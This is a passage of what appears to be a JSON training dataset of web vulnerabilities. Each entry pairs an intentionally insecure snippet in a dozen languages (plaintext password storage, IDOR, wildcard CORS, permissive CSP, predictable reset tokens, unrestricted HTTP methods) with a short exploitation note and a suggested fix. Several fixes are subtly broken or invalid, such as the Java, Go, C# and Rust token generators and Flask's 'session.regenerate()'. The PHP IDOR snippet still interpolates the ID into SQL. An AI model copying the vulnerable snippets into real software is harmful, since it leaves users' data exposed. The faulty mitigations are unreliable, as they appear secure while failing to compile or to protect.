  "code_snippet": "my $api_key = '1234567890abcdef'; my $ua = LWP::UserAgent->new; $ua->get('https://api.com', Authorization => $api_key);",
  "exploitation_techniques": "Extract keys from code or logs.",
  "mitigation": "Use: $ENV{'API_KEY'}"
}
{
  "id": "vuln-610",
  "language": "Node.js",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.password = req.body.password; db.save(user);",
  "exploitation_techniques": "Steal passwords from database breaches.",
  "mitigation": "Use bcrypt: bcrypt.hash(req.body.password, 10).then(hash => db.save({ ...user, password: hash }))"
}
{
  "id": "vuln-611",
  "language": "Python",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user['password'] = request.form['password']; db.insert(user)",
  "exploitation_techniques": "Access plain text passwords from database.",
  "mitigation": "Use bcrypt: user['password'] = bcrypt.hashpw(request.form['password'].encode(), bcrypt.gensalt())"
}
{
  "id": "vuln-612",
  "language": "Java",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.setPassword(request.getParameter(\"password\")); userRepository.save(user);",
  "exploitation_techniques": "Extract plain passwords from database.",
  "mitigation": "Use BCrypt: user.setPassword(BCrypt.hashpw(request.getParameter(\"password\"), BCrypt.gensalt()))"
}
{
  "id": "vuln-613",
  "language": "PHP",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "$user['password'] = $_POST['password']; $db->insert($user);",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Use password_hash: $user['password'] = password_hash($_POST['password'], PASSWORD_BCRYPT);"
}
{
  "id": "vuln-614",
  "language": "Ruby",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user.password = params[:password]; user.save",
  "exploitation_techniques": "Access plain passwords from database.",
  "mitigation": "Use bcrypt: user.password = BCrypt::Password.create(params[:password])"
}
{
  "id": "vuln-615",
  "language": "Go",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.Password = r.FormValue(\"password\"); db.Save(&user)",
  "exploitation_techniques": "Steal passwords from database breaches.",
  "mitigation": "Use bcrypt: hash, _ := bcrypt.GenerateFromPassword([]byte(r.FormValue(\"password\")), bcrypt.DefaultCost)"
}
{
  "id": "vuln-616",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user.Password = model.Password; await db.SaveAsync(user);",
  "exploitation_techniques": "Extract plain passwords from database.",
  "mitigation": "Use BCrypt: user.Password = BCrypt.Net.BCrypt.HashPassword(model.Password)"
}
{
  "id": "vuln-617",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.password = call.request.queryParameters[\"password\"]; userRepo.save(user)",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Use BCrypt: user.password = BCrypt.hashpw(call.request.queryParameters[\"password\"], BCrypt.gensalt())"
}
{
  "id": "vuln-618",
  "language": "Scala",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user.password = params(\"password\"); userRepo.save(user)",
  "exploitation_techniques": "Access plain passwords from database.",
  "mitigation": "Use bcrypt: user.password = BCrypt.hashpw(params(\"password\"), BCrypt.gensalt())"
}
{
  "id": "vuln-619",
  "language": "Rust",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.password = req.form::<User>().await?.password; db.save(user).await;",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Use bcrypt: user.password = bcrypt::hash(req.form::<User>().await?.password, DEFAULT_COST)?;"
}
{
  "id": "vuln-620",
  "language": "Elixir",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user = %{password: params[\"password\"]}; Repo.insert(user)",
  "exploitation_techniques": "Extract plain passwords from database.",
  "mitigation": "Use Bcrypt: user = %{password: Bcrypt.hash_pwd_salt(params[\"password\"])}"
}
{
  "id": "vuln-621",
  "language": "Perl",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "$user->{password} = $r->param('password'); $db->insert($user);",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Use Crypt::Bcrypt: $user->{password} = bcrypt($r->param('password'));"
}
{
  "id": "vuln-622",
  "language": "Node.js",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing internal IDs in URLs.",
  "code_snippet": "app.get('/user/:id', (req, res) => db.findById(req.params.id));",
  "exploitation_techniques": "Access unauthorized records by guessing IDs.",
  "mitigation": "Validate access: if (req.user.id === req.params.id) db.findById(req.params.id)"
}
{
  "id": "vuln-623",
  "language": "Python",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing database IDs in routes.",
  "code_snippet": "@app.route('/user/<id>') def get_user(id): return db.get(id)",
  "exploitation_techniques": "Access records by iterating IDs.",
  "mitigation": "Check permissions: if current_user.id == id: return db.get(id)"
}
{
  "id": "vuln-624",
  "language": "Java",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing internal IDs in endpoints.",
  "code_snippet": "@GetMapping(\"/user/{id}\") public User getUser(@PathVariable Long id) { return userRepo.findById(id); }",
  "exploitation_techniques": "Access unauthorized data by guessing IDs.",
  "mitigation": "Validate: if (authUser.getId().equals(id)) return userRepo.findById(id);"
}
{
  "id": "vuln-625",
  "language": "PHP",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing database IDs in URLs.",
  "code_snippet": "$id = $_GET['id']; $user = $db->query(\"SELECT * FROM users WHERE id = $id\");",
  "exploitation_techniques": "Access records by manipulating IDs.",
  "mitigation": "Validate: if ($loggedInUser['id'] == $id) $db->query(...);"
}
{
  "id": "vuln-626",
  "language": "Ruby",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing internal IDs in routes.",
  "code_snippet": "get '/user/:id' do User.find(params[:id]).to_json end",
  "exploitation_techniques": "Access unauthorized records via ID guessing.",
  "mitigation": "Validate: User.find(params[:id]) if current_user.id == params[:id]"
}
{
  "id": "vuln-627",
  "language": "Go",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing database IDs in endpoints.",
  "code_snippet": "http.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) { id := r.URL.Query().Get(\"id\"); db.Find(id) })",
  "exploitation_techniques": "Access records by guessing IDs.",
  "mitigation": "Validate: if user.ID == id { db.Find(id) }"
}
{
  "id": "vuln-628",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing internal IDs in routes.",
  "code_snippet": "[HttpGet(\"user/{id}\")] public IActionResult GetUser(int id) { return Ok(db.Find(id)); }",
  "exploitation_techniques": "Access unauthorized data by ID manipulation.",
  "mitigation": "Validate: if (User.Identity.Id == id) return Ok(db.Find(id));"
}
{
  "id": "vuln-629",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing database IDs in endpoints.",
  "code_snippet": "get(\"/user/{id}\") { call.respond(userRepo.findById(call.parameters[\"id\"]!!)) }",
  "exploitation_techniques": "Access records by guessing IDs.",
  "mitigation": "Validate: if (call.user.id == call.parameters[\"id\"]) userRepo.findById(...)"
}
{
  "id": "vuln-630",
  "language": "Scala",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing internal IDs in routes.",
  "code_snippet": "get(\"/user/:id\") { userRepo.find(params(\"id\").toLong) }",
  "exploitation_techniques": "Access unauthorized data via ID guessing.",
  "mitigation": "Validate: if (authUser.id == params(\"id\").toLong) userRepo.find(...)"
}
{
  "id": "vuln-631",
  "language": "Rust",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing database IDs in endpoints.",
  "code_snippet": "router.get(\"/user/:id\", |req, res| db.find(req.param(\"id\")?.parse()?))",
  "exploitation_techniques": "Access records by manipulating IDs.",
  "mitigation": "Validate: if user.id == req.param(\"id\")?.parse()? { db.find(...) }"
}
{
  "id": "vuln-632",
  "language": "Elixir",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing internal IDs in routes.",
  "code_snippet": "get \"/user/:id\", UserController, :show",
  "exploitation_techniques": "Access unauthorized records via ID guessing.",
  "mitigation": "Validate: if conn.assigns.current_user.id == params[\"id\"] do Repo.get(User, id) end"
}
{
  "id": "vuln-633",
  "language": "Perl",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Exposing database IDs in URLs.",
  "code_snippet": "my $id = $r->param('id'); my $user = $db->select(\"SELECT * FROM users WHERE id = ?\", $id);",
  "exploitation_techniques": "Access records by guessing IDs.",
  "mitigation": "Validate: if ($logged_in_user->{id} eq $id) { $db->select(...) }"
}
{
  "id": "vuln-634",
  "language": "Node.js",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS policy.",
  "code_snippet": "app.use(cors({ origin: '*' }));",
  "exploitation_techniques": "Make unauthorized cross-origin requests.",
  "mitigation": "Restrict origins: cors({ origin: 'https://mydomain.com' })"
}
{
  "id": "vuln-635",
  "language": "Python",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "app.add_middleware(CORSMiddleware, allow_origins=['*'])",
  "exploitation_techniques": "Perform cross-origin attacks.",
  "mitigation": "Restrict: allow_origins=['https://mydomain.com']"
}
{
  "id": "vuln-636",
  "language": "Java",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS policy.",
  "code_snippet": "@CrossOrigin(origins = \"*\") @GetMapping(\"/api\") public Data getData() { ... }",
  "exploitation_techniques": "Make unauthorized CORS requests.",
  "mitigation": "Restrict: @CrossOrigin(origins = \"https://mydomain.com\")"
}
{
  "id": "vuln-637",
  "language": "PHP",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS headers.",
  "code_snippet": "header('Access-Control-Allow-Origin: *');",
  "exploitation_techniques": "Perform cross-origin attacks.",
  "mitigation": "Restrict: header('Access-Control-Allow-Origin: https://mydomain.com');"
}
{
  "id": "vuln-638",
  "language": "Ruby",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "response.headers['Access-Control-Allow-Origin'] = '*'",
  "exploitation_techniques": "Make unauthorized CORS requests.",
  "mitigation": "Restrict: response.headers['Access-Control-Allow-Origin'] = 'https://mydomain.com'"
}
{
  "id": "vuln-639",
  "language": "Go",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS policy.",
  "code_snippet": "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")",
  "exploitation_techniques": "Perform cross-origin attacks.",
  "mitigation": "Restrict: w.Header().Set(\"Access-Control-Allow-Origin\", \"https://mydomain.com\")"
}
{
  "id": "vuln-640",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "services.AddCors(options => options.AddPolicy(\"AllowAll\", builder => builder.AllowAnyOrigin()));",
  "exploitation_techniques": "Make unauthorized CORS requests.",
  "mitigation": "Restrict: builder.WithOrigins(\"https://mydomain.com\")"
}
{
  "id": "vuln-641",
  "language": "Kotlin",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS policy.",
  "code_snippet": "install(CORS) { anyHost() }",
  "exploitation_techniques": "Perform cross-origin attacks.",
  "mitigation": "Restrict: hosts = listOf(\"https://mydomain.com\")"
}
{
  "id": "vuln-642",
  "language": "Scala",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "response.withHeaders(\"Access-Control-Allow-Origin\" -> \"*\")",
  "exploitation_techniques": "Make unauthorized CORS requests.",
  "mitigation": "Restrict: response.withHeaders(\"Access-Control-Allow-Origin\" -> \"https://mydomain.com\")"
}
{
  "id": "vuln-643",
  "language": "Rust",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS policy.",
  "code_snippet": "res.header(\"Access-Control-Allow-Origin\", \"*\")",
  "exploitation_techniques": "Perform cross-origin attacks.",
  "mitigation": "Restrict: res.header(\"Access-Control-Allow-Origin\", \"https://mydomain.com\")"
}
{
  "id": "vuln-644",
  "language": "Elixir",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "plug CORSPlug, origin: \"*\"",
  "exploitation_techniques": "Make unauthorized CORS requests.",
  "mitigation": "Restrict: plug CORSPlug, origin: \"https://mydomain.com\""
}
{
  "id": "vuln-645",
  "language": "Perl",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS headers.",
  "code_snippet": "$r->headers_out->set('Access-Control-Allow-Origin' => '*');",
  "exploitation_techniques": "Perform cross-origin attacks.",
  "mitigation": "Restrict: $r->headers_out->set('Access-Control-Allow-Origin' => 'https://mydomain.com');"
}
{
  "id": "vuln-646",
  "language": "Node.js",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session IDs after login.",
  "code_snippet": "app.post('/login', (req, res) => { req.session.user = user; });",
  "exploitation_techniques": "Reuse stolen session IDs post-login.",
  "mitigation": "Regenerate: req.session.regenerate(() => { req.session.user = user; })"
}
{
  "id": "vuln-647",
  "language": "Python",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after login.",
  "code_snippet": "@app.route('/login', methods=['POST']) def login(): session['user'] = user",
  "exploitation_techniques": "Hijack sessions using old IDs.",
  "mitigation": "Regenerate: session.regenerate()"
}
{
  "id": "vuln-648",
  "language": "Java",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after authentication.",
  "code_snippet": "HttpSession session = request.getSession(); session.setAttribute(\"user\", user);",
  "exploitation_techniques": "Reuse pre-login session IDs.",
  "mitigation": "Regenerate: request.getSession().invalidate(); request.getSession(true);"
}
{
  "id": "vuln-649",
  "language": "PHP",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session regeneration after login.",
  "code_snippet": "session_start(); $_SESSION['user'] = $user;",
  "exploitation_techniques": "Hijack sessions with old IDs.",
  "mitigation": "Regenerate: session_regenerate_id(true);"
}
{
  "id": "vuln-650",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session IDs post-login.",
  "code_snippet": "post '/login' do session[:user] = user end",
  "exploitation_techniques": "Reuse stolen session IDs.",
  "mitigation": "Regenerate: reset_session; session[:user] = user"
}
{
  "id": "vuln-651",
  "language": "Go",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after login.",
  "code_snippet": "session.Values[\"user\"] = user; session.Save(r, w)",
  "exploitation_techniques": "Hijack sessions using old IDs.",
  "mitigation": "Regenerate: session.Options.MaxAge = -1; session.Save(r, w); session = sessions.NewSession(...)"
}
{
  "id": "vuln-652",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after login.",
  "code_snippet": "HttpContext.Session.SetString(\"user\", user);",
  "exploitation_techniques": "Reuse pre-login session IDs.",
  "mitigation": "Regenerate: HttpContext.Session.Clear(); await HttpContext.Session.CommitAsync();"
}
{
  "id": "vuln-653",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration post-login.",
  "code_snippet": "call.sessions.set(UserSession(user))",
  "exploitation_techniques": "Hijack sessions with old IDs.",
  "mitigation": "Regenerate: call.sessions.clear<UserSession>(); call.sessions.set(UserSession(user))"
}
{
  "id": "vuln-654",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session IDs after login.",
  "code_snippet": "Ok.withSession(\"user\" -> user.id.toString)",
  "exploitation_techniques": "Reuse stolen session IDs.",
  "mitigation": "Regenerate: Ok.withNewSession.withSession(\"user\" -> user.id.toString)"
}
{
  "id": "vuln-655",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session regeneration after login.",
  "code_snippet": "req.session()?.set(\"user\", user)?;",
  "exploitation_techniques": "Hijack sessions using old IDs.",
  "mitigation": "Regenerate: req.session()?.clear(); req.session()?.set(\"user\", user)?;"
}
{
  "id": "vuln-656",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session IDs post-login.",
  "code_snippet": "put_session(conn, :user, user)",
  "exploitation_techniques": "Reuse stolen session IDs.",
  "mitigation": "Regenerate: conn |> clear_session() |> put_session(:user, user)"
}
{
  "id": "vuln-657",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after login.",
  "code_snippet": "$r->session->{user} = $user;",
  "exploitation_techniques": "Hijack sessions with old IDs.",
  "mitigation": "Regenerate: $r->session->expire; $r->session->{user} = $user;"
}
{
  "id": "vuln-658",
  "language": "Node.js",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Overly permissive CSP allowing unsafe scripts.",
  "code_snippet": "app.use((req, res) => res.set('Content-Security-Policy', \"default-src *\"));",
  "exploitation_techniques": "Inject malicious scripts via permissive CSP.",
  "mitigation": "Set strict CSP: res.set('Content-Security-Policy', \"default-src 'self'\")"
}
{
  "id": "vuln-659",
  "language": "Python",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Permissive CSP allowing unsafe sources.",
  "code_snippet": "response.headers['Content-Security-Policy'] = \"default-src *\"",
  "exploitation_techniques": "Execute malicious scripts via loose CSP.",
  "mitigation": "Set: response.headers['Content-Security-Policy'] = \"default-src 'self'\""
}
{
  "id": "vuln-660",
  "language": "Java",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Overly permissive CSP configuration.",
  "code_snippet": "response.setHeader(\"Content-Security-Policy\", \"default-src *\");",
  "exploitation_techniques": "Inject scripts via permissive CSP.",
  "mitigation": "Set: response.setHeader(\"Content-Security-Policy\", \"default-src 'self'\")"
}
{
  "id": "vuln-661",
  "language": "PHP",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Permissive CSP allowing unsafe sources.",
  "code_snippet": "header('Content-Security-Policy: default-src *');",
  "exploitation_techniques": "Execute malicious scripts via CSP.",
  "mitigation": "Set: header('Content-Security-Policy: default-src \\'self\\'');"
}
{
  "id": "vuln-662",
  "language": "Ruby",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Overly permissive CSP.",
  "code_snippet": "response.headers['Content-Security-Policy'] = 'default-src *'",
  "exploitation_techniques": "Inject scripts via loose CSP.",
  "mitigation": "Set: response.headers['Content-Security-Policy'] = 'default-src \\'self\\''"
}
{
  "id": "vuln-663",
  "language": "Go",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Permissive CSP allowing unsafe sources.",
  "code_snippet": "w.Header().Set(\"Content-Security-Policy\", \"default-src *\")",
  "exploitation_techniques": "Execute malicious scripts via CSP.",
  "mitigation": "Set: w.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")"
}
{
  "id": "vuln-664",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Overly permissive CSP configuration.",
  "code_snippet": "Response.Headers.Add(\"Content-Security-Policy\", \"default-src *\");",
  "exploitation_techniques": "Inject scripts via permissive CSP.",
  "mitigation": "Set: Response.Headers.Add(\"Content-Security-Policy\", \"default-src 'self'\");"
}
{
  "id": "vuln-665",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Permissive CSP allowing unsafe sources.",
  "code_snippet": "call.response.header(\"Content-Security-Policy\", \"default-src *\")",
  "exploitation_techniques": "Execute malicious scripts via CSP.",
  "mitigation": "Set: call.response.header(\"Content-Security-Policy\", \"default-src 'self'\")"
}
{
  "id": "vuln-666",
  "language": "Scala",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Overly permissive CSP.",
  "code_snippet": "Ok.withHeaders(\"Content-Security-Policy\" -> \"default-src *\")",
  "exploitation_techniques": "Inject scripts via loose CSP.",
  "mitigation": "Set: Ok.withHeaders(\"Content-Security-Policy\" -> \"default-src 'self'\")"
}
{
  "id": "vuln-667",
  "language": "Rust",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Permissive CSP allowing unsafe sources.",
  "code_snippet": "res.header(\"Content-Security-Policy\", \"default-src *\")",
  "exploitation_techniques": "Execute malicious scripts via CSP.",
  "mitigation": "Set: res.header(\"Content-Security-Policy\", \"default-src 'self'\")"
}
{
  "id": "vuln-668",
  "language": "Elixir",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Overly permissive CSP configuration.",
  "code_snippet": "put_resp_header(conn, \"content-security-policy\", \"default-src *\")",
  "exploitation_techniques": "Inject scripts via permissive CSP.",
  "mitigation": "Set: put_resp_header(conn, \"content-security-policy\", \"default-src 'self'\")"
}
{
  "id": "vuln-669",
  "language": "Perl",
  "vulnerability_type": "Insecure Content Security Policy",
  "description": "Permissive CSP allowing unsafe sources.",
  "code_snippet": "$r->headers_out->set('Content-Security-Policy' => 'default-src *');",
  "exploitation_techniques": "Execute malicious scripts via CSP.",
  "mitigation": "Set: $r->headers_out->set('Content-Security-Policy' => 'default-src \\'self\\'');"
}
{
  "id": "vuln-670",
  "language": "Node.js",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable password reset tokens.",
  "code_snippet": "const token = user.id + '-' + Date.now();",
  "exploitation_techniques": "Guess tokens to reset passwords.",
  "mitigation": "Use: crypto.randomBytes(32).toString('hex')"
}
{
  "id": "vuln-671",
  "language": "Python",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable reset tokens using timestamps.",
  "code_snippet": "token = f'{user.id}-{int(time.time())}'",
  "exploitation_techniques": "Predict tokens based on user ID and time.",
  "mitigation": "Use: secrets.token_hex(32)"
}
{
  "id": "vuln-672",
  "language": "Java",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable password reset tokens.",
  "code_snippet": "String token = user.getId() + \"-\" + System.currentTimeMillis();",
  "exploitation_techniques": "Guess tokens to hijack reset process.",
  "mitigation": "Use SecureRandom: new SecureRandom().nextBytes(new byte[32]).toString()"
}
{
  "id": "vuln-673",
  "language": "PHP",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable reset tokens.",
  "code_snippet": "$token = $user['id'] . '-' . time();",
  "exploitation_techniques": "Predict tokens based on ID and timestamp.",
  "mitigation": "Use: bin2hex(random_bytes(32))"
}
{
  "id": "vuln-674",
  "language": "Ruby",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable password reset tokens.",
  "code_snippet": "token = \"#{user.id}-#{Time.now.to_i}\"",
  "exploitation_techniques": "Guess tokens to reset passwords.",
  "mitigation": "Use: SecureRandom.hex(32)"
}
{
  "id": "vuln-675",
  "language": "Go",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable reset tokens using timestamps.",
  "code_snippet": "token := fmt.Sprintf(\"%d-%d\", user.ID, time.Now().Unix())",
  "exploitation_techniques": "Predict tokens based on user ID and time.",
  "mitigation": "Use crypto/rand: hex.EncodeToString(crypto.Read(new byte[32]))"
}
{
  "id": "vuln-676",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable password reset tokens.",
  "code_snippet": "var token = $\"{user.Id}-{DateTime.Now.Ticks}\";",
  "exploitation_techniques": "Guess tokens to hijack reset process.",
  "mitigation": "Use RNGCryptoServiceProvider: Convert.ToBase64String(new byte[32].GetBytes())"
}
{
  "id": "vuln-677",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable reset tokens.",
  "code_snippet": "val token = \"${user.id}-${System.currentTimeMillis()}\"",
  "exploitation_techniques": "Predict tokens based on ID and timestamp.",
  "mitigation": "Use SecureRandom: SecureRandom().nextBytes(ByteArray(32)).toHex()"
}
{
  "id": "vuln-678",
  "language": "Scala",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable password reset tokens.",
  "code_snippet": "val token = s\"${user.id}-${System.currentTimeMillis()}\"",
  "exploitation_techniques": "Guess tokens to reset passwords.",
  "mitigation": "Use SecureRandom: java.security.SecureRandom().nextBytes(new Array[Byte](32)).toHex"
}
{
  "id": "vuln-679",
  "language": "Rust",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable reset tokens.",
  "code_snippet": "let token = format!(\"{}-{}\", user.id, SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs());",
  "exploitation_techniques": "Predict tokens based on ID and time.",
  "mitigation": "Use: rand::crypto::SystemRandom.fill(&mut [0u8; 32]).to_hex()"
}
{
  "id": "vuln-680",
  "language": "Elixir",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable password reset tokens.",
  "code_snippet": "token = \"#{user.id}-#{:os.system_time(:second)}\"",
  "exploitation_techniques": "Guess tokens to hijack reset process.",
  "mitigation": "Use: :crypto.strong_rand_bytes(32) |> Base.encode16()"
}
{
  "id": "vuln-681",
  "language": "Perl",
  "vulnerability_type": "Insecure Password Reset Token",
  "description": "Predictable reset tokens.",
  "code_snippet": "my $token = \"$user->{id}-\" . time();",
  "exploitation_techniques": "Predict tokens based on ID and timestamp.",
  "mitigation": "Use: Crypt::Random::Source::random_bytes(32)->hex;"
}
{
  "id": "vuln-682",
  "language": "Node.js",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "app.all('/api/*', (req, res) => handleRequest(req));",
  "exploitation_techniques": "Use TRACE or PUT to bypass restrictions.",
  "mitigation": "Restrict methods: app.use('/api/*', (req, res, next) => { if (['GET', 'POST'].includes(req.method)) next(); else res.status(405); })"
}
{
  "id": "vuln-683",
  "language": "Python",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing all HTTP methods.",
  "code_snippet": "@app.route('/api/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'TRACE'])",
  "exploitation_techniques": "Exploit TRACE or PUT for attacks.",
  "mitigation": "Restrict: methods=['GET', 'POST']"
}
{
  "id": "vuln-684",
  "language": "Java",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "@RequestMapping(\"/api\") public Response handleAll(HttpServletRequest request) { ... }",
  "exploitation_techniques": "Use TRACE or PUT to bypass controls.",
  "mitigation": "Restrict: @RequestMapping(value = \"/api\", method = {RequestMethod.GET, RequestMethod.POST})"
}
{
  "id": "vuln-685",
  "language": "PHP",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing all HTTP methods.",
  "code_snippet": "if (in_array($_SERVER['REQUEST_URI'], ['/api'])) { handleRequest(); }",
  "exploitation_techniques": "Exploit TRACE or PUT methods.",
  "mitigation": "Restrict: if (in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST'])) { handleRequest(); }"
}
{
  "id": "vuln-686",
  "language": "Ruby",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "match '/api/*path', to: 'api#handle', via: :all",
  "exploitation_techniques": "Use TRACE or PUT to bypass restrictions.",
  "mitigation": "Restrict: match '/api/*path', to: 'api#handle', via: [:get, :post]"
}
{
  "id": "vuln-687",
  "language": "Go",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing all HTTP methods.",
  "code_snippet": "http.HandleFunc(\"/api\", handleRequest)",
  "exploitation_techniques": "Exploit TRACE or PUT methods.",
  "mitigation": "Restrict: http.HandleFunc(\"/api\", func(w http.ResponseWriter, r *http.Request) { if r.Method == \"GET\" || r.Method == \"POST\" { handleRequest(w, r) } })"
}
{
  "id": "vuln-688",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "[HttpAny(\"/api\")] public IActionResult Handle() { ... }",
  "exploitation_techniques": "Use TRACE or PUT to bypass controls.",
  "mitigation": "Restrict: [HttpGet(\"/api\"), HttpPost(\"/api\")]"
}
{
  "id": "vuln-689",
  "language": "Kotlin",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing all HTTP methods.",
  "code_snippet": "route(\"/api\") { handle { handleRequest(call) } }",
  "exploitation_techniques": "Exploit TRACE or PUT methods.",
  "mitigation": "Restrict: get(\"/api\") { ... }; post(\"/api\") { ... }"
}
{
  "id": "vuln-690",
  "language": "Scala",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "pathPrefix(\"api\") { handleRequest }",
  "exploitation_techniques": "Use TRACE or PUT to bypass restrictions.",
  "mitigation": "Restrict: get { pathPrefix(\"api\") { ... } } ~ post { pathPrefix(\"api\") { ... } }"
}
{
  "id": "vuln-691",
  "language": "Rust",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing all HTTP methods.",
  "code_snippet": "router.any(\"/api\", handle_request)",
  "exploitation_techniques": "Exploit TRACE or PUT methods.",
  "mitigation": "Restrict: router.get(\"/api\", handle_request).post(\"/api\", handle_request)"
}
{
  "id": "vuln-692",
  "language": "Elixir",
  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "match :*, \"/api\", ApiController, :handle",
  "exploitation_techniques": "Use TRACE or PUT to bypass controls.",
  "mitigation": "Restrict: get \"/api\", ApiController, :handle; post \"/api\", ApiController, :handle"
}
{
  "id": "vuln-693",
  "language": "Perl",
